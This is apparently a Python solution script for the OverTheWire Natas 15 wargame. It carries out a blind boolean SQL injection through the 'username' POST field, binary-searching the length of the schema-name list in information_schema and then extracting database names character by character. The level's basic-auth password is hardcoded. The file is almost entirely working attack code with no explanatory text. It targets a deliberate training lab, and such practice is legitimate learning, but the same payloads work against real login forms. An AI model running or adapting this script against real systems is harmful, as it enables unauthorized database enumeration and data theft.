#!/usr/bin/env python3

import requests
import string

alpha_frequency = "eariotnslcudpmhgbfywkvxzjq"

charset = ",_-" + alpha_frequency + "0123456789" + alpha_frequency.upper()

password = ""

url = "http://natas15.natas.labs.overthewire.org/index.php"

basic = requests.auth.HTTPBasicAuth("natas15","TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")

def teste(text):
    if res.text.split("\n")[-5][:15] != "This user doesn":
        return 1
    else:
        return 0

min_len_db = 0
max_len_db = 1000
len_db = 0

while len_db == 0:
    media = (max_len_db + min_len_db) // 2
    payload = '" or length((select group_concat(schema_name) from information_schema.schemata)) > ' + str( media ) + ' #'
    data = {'username':payload}
    res = requests.post(url,data=data,auth=basic)
    if teste(res.text):
        min_len_db = ((max_len_db + min_len_db) // 2) - 1
    else:
        max_len_db = ((max_len_db + min_len_db) // 2) + 1
    print("Min: " + str(min_len_db))
    print("Max: " + str(max_len_db))
    print()
    if (max_len_db - min_len_db) < 40:
        for n in range(min_len_db-1,max_len_db+1):
            print("Trying " + str(n) + " ... ")
            payload = '" or length((select group_concat(schema_name) from information_schema.schemata)) = ' + str( n ) + ' #'
            data = {'username':payload}
            res = requests.post(url,data=data,auth=basic)
            if teste(res.text):
                len_db = n
                break

print("Database length: " + str(len_db))

databases_list = []

for i in range(len_db):
    databases_list.append(' ')

for char in charset:
    for index in range(len_db):
        if databases_list[index] == " ":
            payload = '" or substring((select group_concat(schema_name) from information_schema.schemata),' + str(index+1) + ',1) = "' + char 
            data = {'username':payload}
            res = requests.post(url,data=data,auth=basic)
            if teste(res.text):
                databases_list[index] = char
    print('Database names: ' + ''.join(x for x in databases_list))

print('Database names: ' + ''.join(x for x in databases_list))



